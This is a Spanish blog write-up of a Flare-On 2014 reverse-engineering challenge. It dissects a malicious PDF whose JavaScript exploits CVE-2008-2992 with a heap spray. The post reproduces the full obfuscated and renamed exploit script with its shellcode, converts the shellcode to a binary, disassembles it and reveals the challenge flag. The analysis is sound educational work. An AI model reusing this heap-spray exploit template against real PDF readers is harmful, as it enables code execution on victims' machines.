---
title: "Flare-on 2014 - Challenge 04: Sploitastic"
date: 2018-10-26T22:50:21-06:00
draft: false
tags: ["flareon","revisitado","flareon2014","radare2","reversing","writeup","javascript","pdf"]
categories: ["reversing","ctf"]
---

Continuamos esta serie de retos con el challenge 4 del FLARE-ON 2014, este se trata de un PDF que ejecuta un código malicioso vía Javascript el cual despliega un popup con el titulo \"Owned!!!\"
<!--more-->

Bien comenzamos por descomprimir el challenge "C4.zip", el cual esta protegido por la contraseña "malware".

> Nota: Todos los archivos de challenge se encuentran dentro de un zip que se descarga [aquí][c2c76e1c]

![Unzip and File](/img/flareon2014-c4/unzip-file.png)

Como podemos observar, se guarda un solo archivo (APT9001.pdf), el cual al pasarlo por _file_ nos indica que se trata de un PDF versión 1.5, por lo que recurramos a _exiftool_ y _pdfinfo_ para tener mas información:

![pdfinfo](/img/flareon2014-c4/pdfinfo.png)

Podemos ver que pdfinfo no nos entrega mucha información, mientras que exiftool nos tira un warning.

Vamos abrirlo con evince para ver el contenido:

![Open with Evince](/img/flareon2014-c4/evince.png)

Como podemos observar al abrir el archivo, tenemos dos paginas en donde se ve el inicio del famoso articulo de APT1 de Mandiant (giño sobre la compra de Mandiant por Fireeye), por lo que hasta el momento no tenemos mucha información sobre lo que buscamos.

Procedamos a analizar el pdf con [peepdf][peepdf]:

```
xbytemx@laptop:~/flare-on2014/challenge04$ ~/git/peepdf/peepdf.py -l APT9001.pdf
Warning: PyV8 is not installed!!
Warning: pylibemu is not installed!!

File: APT9001.pdf
MD5: f2bf6b87b5ab15a1889bddbe0be0903f
SHA1: 58c93841ee644a5d2f5062bb755c6b9477ec6c0b
SHA256: 15f3d918c4781749e3c9f470740485fa01d58fd0b003e2f0be171d80ce3b1c2c
Size: 21284 bytes
Version: 1.5
Binary: True
Linearized: False
Encrypted: False
Updates: 0
Objects: 8
Streams: 2
URIs: 0
Comments: 0
Errors: 1

Version 0:
	Catalog: No
	Info: No
	Objects (8): [1, 2, 3, 4, 5, 6, 7, 8]
	Streams (2): [6, 8]
		Encoded (2): [6, 8]
		Decoding errors (1): [8]
	Objects with JS code (1): [6]
	Suspicious elements:
		/OpenAction (1): [1]
		/JS (1): [5]
		/JavaScript (1): [5]
		Adobe JBIG2Decode Heap Corruption (CVE-2009-0658): [8]

```

Tenemos 3 elementos sospechosos, 2 en el objeto 5. Continuemos avanzando y detengamos peepdf aqui.

Veamos que podemos extraer del PDF con pdfextract de _origami-pdf_:

![Origami](/img/flareon2014-c4/origami.png)

Ok, tenemos un dump de un stream dentro del PDF, pero que tipo de dato o referencia tiene este dump? Bueno, exploremos por strings (la manera arcaica) la referencia dentro del PDF:

![strings | grep](/img/flareon2014-c4/strings-grep.png)

Como podemos observar primero por strings, tenemos un texto que dice:

    /Actio#6e   /#53   /#4aav#61#53cr#69pt /#4a#53   6 0 R >> endobj

Esto tras cambiar el encoding es:

    /Action   /S   /JavaScript /JS   6 0 R >> endobj

Después al realizar el grep, podemos ver que hace referencia al objeto del stream 6. Veamos el contenido del obj 6, pero nuevamente necesitamos cambiar el encoding:

    /Lengt#68  6170
     /F#69#6c#74#65r
     /Fla#74eDe#63o#64#65  /AS#43IIHexD#65cod#65 ]

Sustituyendo:

    /Length  6170
     /Filter
     /FlateDecode  /ASCIIHexDecode ]

Con esto nos queda mas claro que dentro del stream 6, se encuentra código javascript que requiere que se descomprima y que se decodifique desde ASCII HEX, lo que aun no queda muy claro es como se hizo esta referencia así que veamos nuevamente con strings hacia atrás:

![obj5 >> obj6](/img/flareon2014-c4/obj5.png)

Ok, entonces tenemos que obj 5 llama al stream, y este a su vez viene del origen 1.0 (accionado por /OpenAction). Esto cierra lo que ya veníamos analizando con peepdf. OpenAction\[1\] llama al código JS\[5\] y a su vez al stream\[6\]

Analicemos el contenido del stream de javascript:

```javascript
var HdPN = "";
var zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf = "";
var IxTUQnOvHg = unescape("%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff");
var MPBPtdcBjTlpvyTYkSwgkrWhXL = "";

for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=128;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA>=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) MPBPtdcBjTlpvyTYkSwgkrWhXL += unescape("%ub32f%u3791");
ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv = MPBPtdcBjTlpvyTYkSwgkrWhXL + IxTUQnOvHg;
OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY = unescape("%ub32f%u3791");
fJWhwERSDZtaZXlhcREfhZjCCVqFAPS = 20;
fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA = fJWhwERSDZtaZXlhcREfhZjCCVqFAPS+ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv.length
while (OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length<fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA) OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY+=OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY;
UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
MOysyGgYplwyZzNdETHwkru = OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.substring(0, OqUWUVrfmYPMBTgnzLKaVHqyDzLRLWulhYMclwxdHrPlyslHTY.length-fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA);
while(MOysyGgYplwyZzNdETHwkru.length+fyVSaXfMFSHNnkWOnWtUtAgDLISbrBOKEdKhLhAvwtdijnaHA < 0x40000) MOysyGgYplwyZzNdETHwkru = MOysyGgYplwyZzNdETHwkru+MOysyGgYplwyZzNdETHwkru+UohsTktonqUXUXspNrfyqyqDQlcDfbmbywFjyLJiesb;
DPwxazRhwbQGu = new Array();
for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<100;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) DPwxazRhwbQGu[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = MOysyGgYplwyZzNdETHwkru + ETXTtdYdVfCzWGSukgeMeucEqeXxPvOfTRBiv;

for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=142;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA>=0;--EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += unescape("%ub550%u0166");
bGtvKT = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length + 20
while (zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length < bGtvKT) zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf += zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
Juphd = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, bGtvKT);
QCZabMzxQiD = zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.substring(0, zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf.length-bGtvKT);
while(QCZabMzxQiD.length+bGtvKT < 0x40000) QCZabMzxQiD = QCZabMzxQiD+QCZabMzxQiD+Juphd;
FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE = new Array();
for (EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA=0;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA<125;EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA++) FovEDIUWBLVcXkOWFAFtYRnPySjMblpAiQIpweE[EvMRYMExyjbCXxMkAjebxXmNeLXvloPzEWhKA] = QCZabMzxQiD + zNfykyBKUZpJbYxaihofpbKLkIDcRxYZWhcohxhunRGf;
```

Ok, esto se ve un poco sucio por lo que renombrare algunas variables para que el código sea mas legible:

```javascript
var unused = "";
var output2 = "";
var payload = unescape("%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff");
var output1 = "";

for (i=128;i>=0;--i) output1 += unescape("%ub32f%u3791");
out1_pay = output1 + payload;
str1 = unescape("%ub32f%u3791");
offset1 = 20;
total_len = offset1+out1_pay.length;
while (str1.length<total_len) str1+=str1;
substr1 = str1.substring(0, total_len);
substr2 = str1.substring(0, str1.length-total_len);
while(substr2.length+total_len < 0x40000) substr2 = substr2+substr2+substr1;
array1 = new Array();
for (i=0;i<100;i++) array1[i] = substr2 + out1_pay;

for (i=142;i>=0;--i) output2 += unescape("%ub550%u0166");
offset2 = output2.length + 20
while (output2.length < offset2) output2 += output2;
substr3 = output2.substring(0, offset2);
substr4 = output2.substring(0, output2.length-offset2);
while(substr4.length+offset2 < 0x40000) substr4 = substr4+substr4+substr3;
array2 = new Array();
for (i=0;i<125;i++) array2[i] = substr4 + output2;
```

El código se comprende un poco mejor, pero lo que tenemos es básicamente padding para el payload. Con esta información, investigando un poco tenemos que se trata de un exploit de una función llamada util.printf() que desencadena un buffer overflow, CVE-2008-2992, lo cual nos permite ejecutar código a nivel de user space. Para mas referencia, podemos visitar el siguiente [enlace](https://resources.infosecinstitute.com/hacking-pdf-part-1/).

Convirtamos ahora el unicode 16 a un archivo binario:

```bash
xbytemx@laptop:~/flare-on2014/challenge04$ echo "%u72f9%u4649%u1525%u7f0d%u3d3c%ue084%ud62a%ue139%ua84a%u76b9%u9824%u7378%u7d71%u757f%u2076%u96d4%uba91%u1970%ub8f9%ue232%u467b%u9ba8%ufe01%uc7c6%ue3c1%u7e24%u437c%ue180%ub115%ub3b2%u4f66%u27b6%u9f3c%u7a4e%u412d%ubbbf%u7705%uf528%u9293%u9990%ua998%u0a47%u14eb%u3d49%u484b%u372f%ub98d%u3478%u0bb4%ud5d2%ue031%u3572%ud610%u6740%u2bbe%u4afd%u041c%u3f97%ufc3a%u7479%u421d%ub7b5%u0c2c%u130d%u25f8%u76b0%u4e79%u7bb1%u0c66%u2dbb%u911c%ua92f%ub82c%u8db0%u0d7e%u3b96%u49d4%ud56b%u03b7%ue1f7%u467d%u77b9%u3d42%u111d%u67e0%u4b92%ueb85%u2471%u9b48%uf902%u4f15%u04ba%ue300%u8727%u9fd6%u4770%u187a%u73e2%ufd1b%u2574%u437c%u4190%u97b6%u1499%u783c%u8337%ub3f8%u7235%u693f%u98f5%u7fbe%u4a75%ub493%ub5a8%u21bf%ufcd0%u3440%u057b%ub2b2%u7c71%u814e%u22e1%u04eb%u884a%u2ce2%u492d%u8d42%u75b3%uf523%u727f%ufc0b%u0197%ud3f7%u90f9%u41be%ua81c%u7d25%ub135%u7978%uf80a%ufd32%u769b%u921d%ubbb4%u77b8%u707e%u4073%u0c7a%ud689%u2491%u1446%u9fba%uc087%u0dd4%u4bb0%ub62f%ue381%u0574%u3fb9%u1b67%u93d5%u8396%u66e0%u47b5%u98b7%u153c%ua934%u3748%u3d27%u4f75%u8cbf%u43e2%ub899%u3873%u7deb%u257a%uf985%ubb8d%u7f91%u9667%ub292%u4879%u4a3c%ud433%u97a9%u377e%ub347%u933d%u0524%u9f3f%ue139%u3571%u23b4%ua8d6%u8814%uf8d1%u4272%u76ba%ufd08%ube41%ub54b%u150d%u4377%u1174%u78e3%ue020%u041c%u40bf%ud510%ub727%u70b1%uf52b%u222f%u4efc%u989b%u901d%ub62c%u4f7c%u342d%u0c66%ub099%u7b49%u787a%u7f7e%u7d73%ub946%ub091%u928d%u90bf%u21b7%ue0f6%u134b%u29f5%u67eb%u2577%ue186%u2a05%u66d6%ua8b9%u1535%u4296%u3498%ub199%ub4ba%ub52c%uf812%u4f93%u7b76%u3079%ubefd%u3f71%u4e40%u7cb3%u2775%ue209%u4324%u0c70%u182d%u02e3%u4af9%ubb47%u41b6%u729f%u9748%ud480%ud528%u749b%u1c3c%ufc84%u497d%u7eb8%ud26b%u1de0%u0d76%u3174%u14eb%u3770%u71a9%u723d%ub246%u2f78%u047f%ub6a9%u1c7b%u3a73%u3ce1%u19be%u34f9%ud500%u037a%ue2f8%ub024%ufd4e%u3d79%u7596%u9b15%u7c49%ub42f%u9f4f%u4799%uc13b%ue3d0%u4014%u903f%u41bf%u4397%ub88d%ub548%u0d77%u4ab2%u2d93%u9267%ub198%ufc1a%ud4b9%ub32c%ubaf5%u690c%u91d6%u04a8%u1dbb%u4666%u2505%u35b7%u3742%u4b27%ufc90%ud233%u30b2%uff64%u5a32%u528b%u8b0c%u1452%u728b%u3328%ub1c9%u3318%u33ff%uacc0%u613c%u027c%u202c%ucfc1%u030d%ue2f8%u81f0%u5bff%u4abc%u8b6a%u105a%u128b%uda75%u538b%u033c%uffd3%u3472%u528b%u0378%u8bd3%u2072%uf303%uc933%uad41%uc303%u3881%u6547%u5074%uf475%u7881%u7204%u636f%u7541%u81eb%u0878%u6464%u6572%ue275%u8b49%u2472%uf303%u8b66%u4e0c%u728b%u031c%u8bf3%u8e14%ud303%u3352%u57ff%u6168%u7972%u6841%u694c%u7262%u4c68%u616f%u5464%uff53%u68d2%u3233%u0101%u8966%u247c%u6802%u7375%u7265%uff54%u68d0%u786f%u0141%udf8b%u5c88%u0324%u6168%u6567%u6842%u654d%u7373%u5054%u54ff%u2c24%u6857%u2144%u2121%u4f68%u4e57%u8b45%ue8dc%u0000%u0000%u148b%u8124%u0b72%ua316%u32fb%u7968%ubece%u8132%u1772%u45ae%u48cf%uc168%ue12b%u812b%u2372%u3610%ud29f%u7168%ufa44%u81ff%u2f72%ua9f7%u0ca9%u8468%ucfe9%u8160%u3b72%u93be%u43a9%ud268%u98a3%u8137%u4772%u8a82%u3b62%uef68%u11a4%u814b%u5372%u47d6%uccc0%ube68%ua469%u81ff%u5f72%ucaa3%u3154%ud468%u65ab%u8b52%u57cc%u5153%u8b57%u89f1%u83f7%u1ec7%ufe39%u0b7d%u3681%u4542%u4645%uc683%ueb04%ufff1%u68d0%u7365%u0173%udf8b%u5c88%u0324%u5068%u6f72%u6863%u7845%u7469%uff54%u2474%uff40%u2454%u5740%ud0ff" | sed 's/\%u//g' | xxd -r -p | dd conv=swab of=shellcode.bin
```

Rápidamente imprimimos el código unicode16, sustituimos la parte que dice que es unicode y le indicamos a xxd que haga la conversión de hexa a binario en una sola linea. Finalmente uso DD para cambiar el endianess y salvar el binario.

Ahora podemos usar cualquier desemsamblador para analizar el binario. En mi caso continuare con radare2:

![Entorno de radare2](/img/flareon2014-c4/r2-env.png)

Comenzamos por verificar si hay strings conocidos, por lo que ejecutamos un _izz_ y nos topamos con los siguientes strings al final del shellcode:

![Todos los strings via radare2](/img/flareon2014-c4/r2-izz.png)

Como podemos ver, siguiendo las direcciones que tenemos en pantalla, vamos a ver donde están esos strings:

![Push Loads](/img/flareon2014-c4/r2-messageboxa.png)

Completando los push que no tienen resuelto el hexa a string (considerar los moches con los mov) tenemos lo siguiente:

    LoadLibraryA
    user32
    MessageBoxA
    OWNED!!!

Podemos comenzar a interpretar que [LoadLibraryA](https://docs.microsoft.com/en-us/windows/desktop/api/libloaderapi/nf-libloaderapi-loadlibrarya) realiza una llamada a la DLL **user32** durante la ejecución, y a su vez se llama a la función [MessageBoxA](https://docs.microsoft.com/en-us/windows/desktop/api/winuser/nf-winuser-messagebox).

Esta función requiere de 4 parámetros:

```
int MessageBox(
  HWND    hWnd,
  LPCTSTR lpText,
  LPCTSTR lpCaption,
  UINT    uType
);
```

Tenemos un valor que se ve después que se declara la función, el cual es EBX = "OWNED!!!":

```
0x0000034d      6844212121     push 0x21212144             ; 'D!!!'
0x00000352      684f574e45     push 0x454e574f             ; 'OWNE'
0x00000357      8bdc           mov ebx, esp
```

Tenemos otro valor extraño, que es ECX. Aquí se esta realizando XOR entre la dirección incrementada +12 y un valor para cada bloque. Resolviendo el XOR nuestra flag aparece:

```
0x0000035e      8b1424         mov edx, dword [esp]                 ; Salvo la ubicacion de ESP en EDX
0x00000361      81720b16a3fb.  xor dword [edx + 0xb], 0x32fba316    ; XOR de EDX+11 (0x32bece79) con 0x32fba316 = "omE"
0x00000368      6879cebe32     push 0x32bece79                      ;
0x0000036d      817217ae45cf.  xor dword [edx + 0x17], 0x48cf45ae   ; XOR de EDX+23 (0x2be12bc1) con 0x48cf45ae = "on.c"
0x00000374      68c12be12b     push 0x2be12bc1                      ;
0x00000379      81722310369f.  xor dword [edx + 0x23], 0xd29f3610   ; XOR de EDX+35 (0xfffa4471) con 0xd29f3610 = "are-"
0x00000380      687144faff     push 0xfffa4471                      ;
0x00000385      81722ff7a9a9.  xor dword [edx + 0x2f], 0xca9a9f7    ; XOR de EDX+47 (0x60cfe984) con 0xca9a9f7 = "s@fl"
0x0000038c      6884e9cf60     push 0x60cfe984                      ;
0x00000391      81723bbe93a9.  xor dword [edx + 0x3b], 0x43a993be   ; XOR de EDX+59 (0x3798a3d2) con 0x43a993be = "l01t"
0x00000398      68d2a39837     push 0x3798a3d2                      ;
0x0000039d      817247828a62.  xor dword [edx + 0x47], 0x3b628a82   ; XOR de EDX+71 (0x4b11a4ef) con 0x3b628a82 = "m.sp"
0x000003a4      68efa4114b     push 0x4b11a4ef                      ;
0x000003a9      817253d647c0.  xor dword [edx + 0x53], 0xccc047d6   ; XOR de EDX+83 (0xffa469be) con 0xccc047d6 = "h.d3"
0x000003b0      68be69a4ff     push 0xffa469be                      ;
0x000003b5      81725fa3ca54.  xor dword [edx + 0x5f], 0x3154caa3   ; XOR de EDX+95 (0x5265abd4) con 0x3154caa3 = "wa1c"
0x000003bc      68d4ab6552     push 0x5265abd4                      ;
0x000003c1      8bcc           mov ecx, esp                         ; Salvo el valor de ESP en ECX
```

Después tenemos 4 pushes, correspondientes a las variables de MessageBoxA:

```
0x000003c3      57             push edi = uType = 0
0x000003c4      53             push ebx = lpCaption = "OWNED!!!"
0x000003c5      51             push ecx = lpText = "wa1ch.d3m.spl01ts@flare-on.comE"
0x000003c6      57             push edi = hWnd = 0
```

Continuamos con un loop de XOR que modifica el valor de lpText para cifrarlo:

![XOR the text!](/img/flareon2014-c4/r2-xor.png)

Finalmente, EAX es llamado para a su vez, llamar a MessageBoxA con sus parámetros (call eax), y al final tenemos el ultimo "Call EAX" que también llama a la función ExitProcess con parámetro 0:

![Push Loads](/img/flareon2014-c4/r2-calleax.png)

Este shellcode puede ser cargado en un exe para ejecutarlo y validar lo que el análisis estático ya nos revelo. También durante la ejecución del debugger podemos comparar el valor antes de que salga a pantalla.

En mi caso use el scdbg+unicorn para interpretar directamente las instrucciones del shellcode, teniendo la siguiente salida:

![Shellcode Execution](/img/flareon2014-c4/scdbg1.png)

Esta salida también nos indica las llamadas que realiza el shellcode, ya una vez que todo fue correctamente entregado.

Veamos ahora si detenemos el emulador justo cuando subiamos el valor a ECX antes del XOR de cifrado:

![Shellcode Emulation and memory dump](/img/flareon2014-c4/scdbg2.png)

Otra manera también es construir un exe con el payload, en mi caso use la pagina de [sandsprite](http://sandsprite.com/shellcode_2_exe.php) para generarlo:

![Shellcode to EXE](/img/flareon2014-c4/shellcode2exe.png)

Tras ejecutarlo con wine tenemos el mensaje que ya nos iba indicando scdbg:

![Running EXE with Shellcode](/img/flareon2014-c4/shellcode-exe.png)

Y listo, hemos podido encontrar la flag dentro de la variable del texto del mensaje.

**flag: wa1ch.d3m.spl01ts@flare-on.com**

---

Espero que les haya gustado.

Saludos,

  [c2c76e1c]: http://www.flare-on.com/files/2014_FLAREOn_Challenges.zip "Flare-On 2014"
  [peepdf]: https://github.com/jesparza/peepdf "PeePDF"
